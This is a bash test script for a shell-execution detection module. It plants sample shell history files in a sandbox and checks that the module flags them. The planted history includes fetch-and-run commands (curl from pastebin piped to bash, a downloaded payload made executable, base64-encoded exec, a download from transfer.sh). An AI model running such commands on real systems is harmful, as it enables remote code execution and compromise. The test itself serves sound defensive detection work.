#!/usr/bin/env bash
set -e
source "$(dirname "$0")/helpers.sh"

# Test 1: Plant suspicious shell history
setup_sandbox

cat > "$SANDBOX/.bash_history" << 'HIST'
ls -la
cd /tmp
curl -sSL https://pastebin.com/raw/abc123 | bash
echo "normal command"
wget -q https://cdn.discordapp.com/attachments/payload.sh -O /tmp/x && chmod +x /tmp/x
python3 -c "import base64; exec(base64.b64decode('cHJpbnQoJ2hlbGxvJyk='))"
git status
HIST

cat > "$SANDBOX/.zsh_history" << 'HIST'
: 1700000000:0;curl https://transfer.sh/malware -o /tmp/m
: 1700000001:0;ls
HIST

output=$(bash "$REPO_ROOT/modules/execution/T1059.004-unix-shell.sh" 2>&1) || true
assert_detected "T1059.004" "$output" || { teardown_sandbox; exit 1; }

teardown_sandbox

# Test 2: Clean history
setup_sandbox
echo -e "ls\ncd\ngit status\nnpm install" > "$SANDBOX/.bash_history"
output=$(bash "$REPO_ROOT/modules/execution/T1059.004-unix-shell.sh" 2>&1) || true
teardown_sandbox

echo "PASS"
exit 0
